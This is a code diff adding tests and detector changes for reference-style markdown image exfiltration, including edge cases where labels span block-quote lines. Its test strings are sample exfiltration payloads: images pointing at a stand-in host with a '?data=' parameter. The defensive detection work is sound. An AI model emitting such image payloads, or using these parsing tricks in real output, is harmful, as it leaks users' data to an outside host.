@@ -224,6 +224,14 @@ describe('reference-style markdown image exfiltration (#219)', () => {
       }
     });
   });
+  it('reads a continuation line that starts a block quote as a quote, not as label text (#227)', () => {
+    // The `>` starts a real quote, so the label is broken and nothing renders.
+    expect(flags('- ![a][R\n> z]\n\n[r z]: https://e.x/p.png?data=Q')).toBe(false);
+    // Four spaces make it label text, which does render.
+    expect(flags('x ![a][a\n    > b]\n\n[a > b]: https://e.x/p.png?data=Q')).toBe(true);
+    // Inside one quote the marker is dropped from both lines.
+    expect(flags('> x ![a][my\n> label]\n\n> [my\n> label]: https://e.x/p.png?data=Q')).toBe(true);
+  });
   it('matches a NUL in a label to U+FFFD, and a label split across block quote lines (#224)', () => {
     expect(flags('![a][r\u0000]\n\n[r\ufffd]: https://e.x/p.png?data=Q')).toBe(true);
     expect(flags('> x ![a][my\n> label]\n\n> [my\n> label]: https://e.x/p.png?data=Q')).toBe(true);
@@ -472,7 +480,8 @@ function reference(content: string): Array<[number, number]> {
       }
     } else if (content[afterAlt] === '(') return;
     if (label === undefined && end === afterAlt && !alt.inner) label = content.slice(at + 2, alt.end);
-    if (label !== undefined && keysOf(label).some((key) => key !== '' && flagged.has(key))) hits.push([at, end]);
+    // The raw reading has no block structure, so an image's label is matched without dropping quote markers (#227).
+    if (label !== undefined && [norm1(label, false)].some((key) => key !== '' && flagged.has(key))) hits.push([at, end]);
   };
   for (let i = 0; i < n - 1; i++) {
     if (!(content[i] === '!' && content[i + 1] === '[')) continue;
@@ -497,7 +506,7 @@ function reference(content: string): Array<[number, number]> {
         if (opened === undefined && closes > 0 && content[i + 1] === '[') {
           const le = labelEnd(i + 1);
           if (le >= 0) {
-            if (keysOf(content.slice(i + 2, le)).some((key) => key !== '' && flagged.has(key))) hits.push([lastBang, le + 1]);
+            if ([norm1(content.slice(i + 2, le), false)].some((key) => key !== '' && flagged.has(key))) hits.push([lastBang, le + 1]);
           }
         }
         closes++;
